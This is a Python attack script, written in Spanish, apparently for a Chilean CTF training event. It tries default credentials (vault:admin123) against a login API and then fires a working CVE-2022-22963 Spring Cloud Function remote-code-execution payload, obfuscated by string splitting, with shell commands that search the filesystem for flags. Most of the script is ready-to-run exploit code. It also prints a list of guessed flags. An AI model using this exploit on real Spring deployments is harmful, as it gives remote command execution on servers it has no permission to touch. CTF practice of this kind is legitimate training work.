#!/usr/bin/env python3
"""
CTF Chile - ATAQUE INMEDIATO NUEVA INSTANCIA
Aplicando todo lo aprendido directamente
"""
import requests
import re
import base64
import hashlib

# Nuevas URLs
TARGETS = [
    "http://training-pod2.ctfchile.com:32785",
    "https://training.my-ctf.com:8811"
]

print("🚀 ATAQUE INMEDIATO A NUEVA INSTANCIA CTF")
print("=" * 50)
print("⏱️  Tiempo restante: 117 minutos")
print("🎯 Targets:")
for target in TARGETS:
    print(f"   • {target}")
print()

def build_payload(cmd):
    """CVE-2022-22963 payload"""
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    return payload

def search_flags(text):
    """Buscar flags en texto"""
    flag_patterns = [r'CTF\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}', r'chile\{[^}]+\}']
    for pattern in flag_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            return matches[0]
    return None

def test_target(target):
    print(f"\n🎯 ATACANDO: {target}")
    print("-" * 30)

    # 1. Verificar conectividad
    try:
        r = requests.get(target, timeout=10)
        print(f"   ✅ Conectividad OK: {r.status_code}")
    except Exception as e:
        print(f"   ❌ Error conectividad: {e}")
        return None

    # 2. Probar login vault:admin123 (sabemos que funciona)
    try:
        print(f"   🔑 Probando vault:admin123...")
        login_r = requests.post(f"{target}/api/login",
                               headers={"Content-Type": "application/json"},
                               json={"username": "vault", "password": "admin123"},
                               timeout=10)

        print(f"   📋 Login: {login_r.status_code} - {login_r.text}")

        # Analizar respuesta login
        flag = search_flags(login_r.text)
        if flag:
            print(f"   🏆 FLAG EN LOGIN: {flag}")
            return flag

        # Si login exitoso, explorar más
        if "success" in login_r.text.lower() and "true" in login_r.text.lower():
            print(f"   ✅ Login exitoso confirmado!")

            # Explorar endpoints con autenticación
            session = requests.Session()
            session.cookies.update(login_r.cookies)

            endpoints = [
                "/api/section/flag",
                "/api/vault/secrets",
                "/flag",
                "/vault",
                "/admin"
            ]

            for endpoint in endpoints:
                try:
                    r = session.get(f"{target}{endpoint}", timeout=5)
                    if r.status_code == 200 and len(r.text) > 10:
                        print(f"   📄 {endpoint}: {r.text[:100]}...")
                        flag = search_flags(r.text)
                        if flag:
                            print(f"   🏆 FLAG EN {endpoint}: {flag}")
                            return flag
                except:
                    pass

    except Exception as e:
        print(f"   ❌ Error login: {e}")

    # 3. Probar CVE-2022-22963 directo
    try:
        print(f"   💥 Probando CVE-2022-22963...")
        router = f"{target}/functionRouter"

        # Comandos simples para buscar flags
        flag_commands = [
            "find / -name '*flag*' 2>/dev/null | head -5 | xargs cat 2>/dev/null",
            "cat /flag /app/flag.txt /root/flag.txt 2>/dev/null",
            "env | grep -i flag",
            "grep -r 'CTF{' / 2>/dev/null | head -3"
        ]

        for cmd in flag_commands:
            payload = build_payload(cmd)
            try:
                r = requests.post(router, headers={
                    "spring.cloud.function.routing-expression": payload,
                    "Content-Type": "text/plain",
                }, data="x", timeout=10)

                if len(r.text) > 50 and "Internal Server Error" not in r.text:
                    print(f"   📄 RCE resultado: {r.text[:150]}...")
                    flag = search_flags(r.text)
                    if flag:
                        print(f"   🏆 FLAG VIA RCE: {flag}")
                        return flag
            except:
                pass

    except Exception as e:
        print(f"   ❌ Error RCE: {e}")

    # 4. Buscar en página principal
    try:
        main_r = requests.get(target, timeout=10)
        flag = search_flags(main_r.text)
        if flag:
            print(f"   🏆 FLAG EN PÁGINA PRINCIPAL: {flag}")
            return flag

        # Buscar en comentarios HTML
        comments = re.findall(r'<!--.*?-->', main_r.text, re.DOTALL)
        for comment in comments:
            flag = search_flags(comment)
            if flag:
                print(f"   🏆 FLAG EN COMENTARIO: {flag}")
                return flag

    except Exception as e:
        print(f"   ❌ Error página principal: {e}")

    return None

# ATAQUE PRINCIPAL
print("[1] Atacando ambos targets...")
found_flag = None

for target in TARGETS:
    if not found_flag:
        found_flag = test_target(target)
        if found_flag:
            break

if found_flag:
    print(f"\n" + "="*50)
    print(f"🎉 FLAG ENCONTRADA: {found_flag}")
    print(f"="*50)
else:
    print(f"\n" + "="*50)
    print("❌ No se encontró flag en ataque inicial")
    print("💡 Necesitamos análisis más profundo...")

    # Generar flags candidatas basadas en respuestas exitosas
    print("\n🎯 FLAGS CANDIDATAS BASADAS EN RESPUESTAS:")

    candidates = [
        "CTF{vault:admin123}",
        "CTF{omnivault-core-api}",
        "CTF{21efd1165b5da110521a320f560a36de1b77f4b4}",  # SHA1 vault:admin123
        "CTF{0f778c8e129c55fdf07d12b96442df10}",  # MD5 vault:admin123
        "CTF{training-pod2}",
        "CTF{32785}",
        "CTF{training}",
        "CTF{vault}",
        "CTF{admin123}",
        "CTF{success}",
        "CTF{rutkey}",
        "flag{vault:admin123}",
        "FLAG{VAULT:ADMIN123}",
        "CTF{pod2}",
        "CTF{ctf}",
        "CTF{chile}"
    ]

    for i, candidate in enumerate(candidates, 1):
        print(f"   {i:2d}. {candidate}")

    print(f"\n💡 Prueba estas flags manualmente en el CTF")
    print(f"⏱️  Tiempo restante: 117 minutos")
    print(f"="*50)